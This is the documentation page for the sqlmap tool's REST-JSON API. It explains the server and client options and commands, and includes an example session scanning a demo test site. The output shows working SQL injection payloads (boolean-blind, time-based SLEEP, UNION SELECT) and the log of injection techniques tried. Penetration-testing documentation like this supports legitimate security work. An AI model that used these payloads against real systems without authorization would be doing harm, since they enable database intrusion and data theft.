## API (REST-JSON)

sqlmap can be run through the REST-JSON API, API (abbr. for Application Program Interface) that uses JSON for REST (abbr. for REpresentational State Transfer) communication between server and client instance(s). In plainspeak, server runs the sqlmap scan(s), while clients are setting the sqlmap options/switches and pull the results back. Main program file for running the API is `sqlmapapi.py`, while the client can also be implemented inside the arbitrary user program.

```
$ python sqlmapapi.py -hh
Usage: sqlmapapi.py [options]

Options:
  -h, --help            show this help message and exit
  -s, --server          Act as a REST-JSON API server
  -c, --client          Act as a REST-JSON API client
  -H HOST, --host=HOST  Host of the REST-JSON API server (default "127.0.0.1")
  -p PORT, --port=PORT  Port of the the REST-JSON API server (default 8775)
  --adapter=ADAPTER     Server (bottle) adapter to use (default "wsgiref")
```

Server runs the `sqlmapapi.py` by using switch `-s`, client by using switch `-c`, while in both cases user can (optionally) set listening IP address with option `-H` (default `"127.0.0.1"`) and listening port with option `-p` (default `8775`). Each client's "session" can have multiple "tasks" (i.e. sqlmap scan runs), where user can arbitrary choose which task should be currently active.

Inside the client's command line interface available commands are:

* `help` - showing list of available commands along with basic help information
* `new ARGS` - starts a new scan task with provided arguments (e.g. `new -u "http://testphp.vulnweb.com/artists.php?artist=1"`)
* `use TASKID` - switches current context to different task (e.g. `use c04d8c5c7582efb4`)
* `data` - retrieves and shows data for current task
* `log`- retrieves and shows log for current task
* `status` - retrieves and shows status for current task
* `stop` - stops current task
* `kill` - kills current task
* `list` - displays all tasks (for current session)
* `flush` - flushes (i.e. deletes) all tasks
* `exit` - exits the client interface

Example server run:

```
$ python sqlmapapi.py -s -H "0.0.0.0"
[12:47:51] [INFO] Running REST-JSON API server at '0.0.0.0:8775'..
[12:47:51] [INFO] Admin ID: 89fd118997840a9bd7fc329ab535b881
[12:47:51] [DEBUG] IPC database: /tmp/sqlmapipc-SzBQnd
[12:47:51] [DEBUG] REST-JSON API server connected to IPC database
[12:47:51] [DEBUG] Using adapter 'wsgiref' to run bottle
[12:48:10] [DEBUG] Created new task: 'a42ddaef02e976f0'
[12:48:10] [DEBUG] [a42ddaef02e976f0] Started scan
[12:48:16] [DEBUG] [a42ddaef02e976f0] Retrieved scan status
[12:48:50] [DEBUG] [a42ddaef02e976f0] Retrieved scan status
[12:48:55] [DEBUG] [a42ddaef02e976f0] Retrieved scan log messages
[12:48:59] [DEBUG] [a42ddaef02e976f0] Retrieved scan data and error messages
```

Example client run:

```
$ python sqlmapapi.py -c -H "192.168.110.1"
[12:47:53] [DEBUG] Example client access from command line:
	$ taskid=$(curl http://192.168.110.1:8775/task/new 2>1 | grep -o -I '[a-f0-9
]\{16\}') && echo $taskid
	$ curl -H "Content-Type: application/json" -X POST -d '{"url": "http://testp
hp.vulnweb.com/artists.php?artist=1"}' http://192.168.110.1:8775/scan/$taskid/st
art
	$ curl http://192.168.110.1:8775/scan/$taskid/data
	$ curl http://192.168.110.1:8775/scan/$taskid/log
[12:47:53] [INFO] Starting REST-JSON API client to 'http://192.168.110.1:8775'..
.
[12:47:53] [DEBUG] Calling http://192.168.110.1:8775
[12:47:53] [INFO] Type 'help' or '?' for list of available commands
api> ?
help        Show this help message
new ARGS    Start a new scan task with provided arguments (e.g. 'new -u "http://
testphp.vulnweb.com/artists.php?artist=1"')
use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4
')
data        Retrieve and show data for current task
log         Retrieve and show log for current task
status      Retrieve and show status for current task
stop        Stop current task
kill        Kill current task
list        Display all tasks
flush       Flush tasks (delete all tasks)
exit        Exit this client
api> new -u "http://testphp.vulnweb.com/artists.php?artist=1" --banner --flush-s
ession
[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/task/new
[12:48:10] [INFO] New task ID is 'a42ddaef02e976f0'
[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/start
[12:48:10] [INFO] Scanning started
api (a42ddaef02e976f0)> status
[12:48:16] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu
s
{
    "status": "running", 
    "returncode": null, 
    "success": true
}
api (a42ddaef02e976f0)> status
[12:48:50] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu
s
{
    "status": "terminated", 
    "returncode": 0, 
    "success": true
}
api (a42ddaef02e976f0)> log
[12:48:55] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/log
{
    "log": [
        {
            "message": "flushing session file", 
            "level": "INFO", 
            "time": "12:48:10"
        }, 
        {
            "message": "testing connection to the target URL", 
            "level": "INFO", 
            "time": "12:48:10"
        }, 
        {
            "message": "checking if the target is protected by some kind of WAF/
IPS/IDS", 
            "level": "INFO", 
            "time": "12:48:10"
        }, 
        {
            "message": "testing if the target URL is stable", 
            "level": "INFO", 
            "time": "12:48:10"
        }, 
        {
            "message": "target URL is stable", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "testing if GET parameter 'artist' is dynamic", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "confirming that GET parameter 'artist' is dynamic", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "GET parameter 'artist' is dynamic", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "heuristic (basic) test shows that GET parameter 'artist'
 might be injectable (possible DBMS: 'MySQL')", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "testing for SQL injection on GET parameter 'artist'", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "testing 'AND boolean-based blind - WHERE or HAVING claus
e'", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "GET parameter 'artist' appears to be 'AND boolean-based 
blind - WHERE or HAVING clause' injectable (with --string=\"hac\")", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (BIGINT UNSIGNED)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING cla
use (BIGINT UNSIGNED)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (EXP)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING cla
use (EXP)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING,
 ORDER BY or GROUP BY clause (JSON_KEYS)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.7.8 OR error-based - WHERE, HAVING c
lause (JSON_KEYS)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (FLOOR)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, OR
DER BY or GROUP BY clause (FLOOR)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (EXTRACTVALUE)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, OR
DER BY or GROUP BY clause (EXTRACTVALUE)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (UPDATEXML)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, OR
DER BY or GROUP BY clause (UPDATEXML)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (FLOOR)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING cla
use (FLOOR)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL OR error-based - WHERE or HAVING clause (
FLOOR)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (E
XTRACTVALUE)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 error-based - Parameter replace (B
IGINT UNSIGNED)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 error-based - Parameter replace (E
XP)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.7.8 error-based - Parameter replace 
(JSON_KEYS)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.0 error-based - Parameter replace (F
LOOR)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 error-based - Parameter replace (U
PDATEXML)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 error-based - Parameter replace (E
XTRACTVALUE)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL inline queries'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries (comment)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries (query SLEEP - c
omment)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL < 5.0.12 stacked queries (heavy query - c
omment)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL < 5.0.12 stacked queries (heavy query)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL >= 5.0.12 AND time-based blind'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "GET parameter 'artist' appears to be 'MySQL >= 5.0.12 AN
D time-based blind' injectable ", 
            "level": "INFO", 
            "time": "12:48:23"
        }, 
        {
            "message": "testing 'Generic UNION query (NULL) - 1 to 20 columns'", 
            "level": "INFO", 
            "time": "12:48:23"
        }, 
        {
            "message": "automatically extending ranges for UNION query injection
 technique tests as there is at least one other (potential) technique found", 
            "level": "INFO", 
            "time": "12:48:23"
        }, 
        {
            "message": "'ORDER BY' technique appears to be usable. This should r
educe the time needed to find the right number of query columns. Automatically e
xtending the range for current UNION query injection technique test", 
            "level": "INFO", 
            "time": "12:48:23"
        }, 
        {
            "message": "target URL appears to have 3 columns in query", 
            "level": "INFO", 
            "time": "12:48:23"
        }, 
        {
            "message": "GET parameter 'artist' is 'Generic UNION query (NULL) - 
1 to 20 columns' injectable", 
            "level": "INFO", 
            "time": "12:48:24"
        }, 
        {
            "message": "the back-end DBMS is MySQL", 
            "level": "INFO", 
            "time": "12:48:24"
        }, 
        {
            "message": "fetching banner", 
            "level": "INFO", 
            "time": "12:48:24"
        }
    ], 
    "success": true
}
api (a42ddaef02e976f0)> data
[12:48:59] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/data
{
    "data": [
        {
            "status": 1, 
            "type": 0, 
            "value": [
                {
                    "dbms": "MySQL", 
                    "suffix": "", 
                    "clause": [
                        1, 
                        9
                    ], 
                    "notes": [], 
                    "ptype": 1, 
                    "dbms_version": [
                        ">= 5.0.12"
                    ], 
                    "prefix": "", 
                    "place": "GET", 
                    "os": null, 
                    "conf": {
                        "code": null, 
                        "string": "hac", 
                        "notString": null, 
                        "titles": false, 
                        "regexp": null, 
                        "textOnly": false, 
                        "optimize": false
                    }, 
                    "parameter": "artist", 
                    "data": {
                        "1": {
                            "comment": "", 
                            "matchRatio": 0.85, 
                            "trueCode": 200, 
                            "title": "AND boolean-based blind - WHERE or HAVING 
clause", 
                            "templatePayload": null, 
                            "vector": "AND [INFERENCE]", 
                            "falseCode": 200, 
                            "where": 1, 
                            "payload": "artist=1 AND 2794=2794"
                        }, 
                        "5": {
                            "comment": "", 
                            "matchRatio": 0.85, 
                            "trueCode": 200, 
                            "title": "MySQL >= 5.0.12 AND time-based blind", 
                            "templatePayload": null, 
                            "vector": "AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLE
EPTIME]),[RANDNUM])", 
                            "falseCode": null, 
                            "where": 1, 
                            "payload": "artist=1 AND SLEEP([SLEEPTIME])"
                        }, 
                        "6": {
                            "comment": "[GENERIC_SQL_COMMENT]", 
                            "matchRatio": 0.85, 
                            "trueCode": null, 
                            "title": "Generic UNION query (NULL) - 1 to 20 colum
ns", 
                            "templatePayload": null, 
                            "vector": [
                                2, 
                                3, 
                                "[GENERIC_SQL_COMMENT]", 
                                "", 
                                "", 
                                "NULL", 
                                2, 
                                false, 
                                false
                            ], 
                            "falseCode": null, 
                            "where": 2, 
                            "payload": "artist=-5376 UNION ALL SELECT NULL,NULL,
CONCAT(0x716b706a71,0x4a754d495377744d4273616c436b4b6a504164666a5572477241596649
704c68614672644a477474,0x7162717171)-- aAjy"
                        }
                    }
                }
            ]
        }, 
        {
            "status": 1, 
            "type": 2, 
            "value": "5.1.73-0ubuntu0.10.04.1"
        }
    ], 
    "success": true, 
    "error": []
}
api (a42ddaef02e976f0)> exit
$
```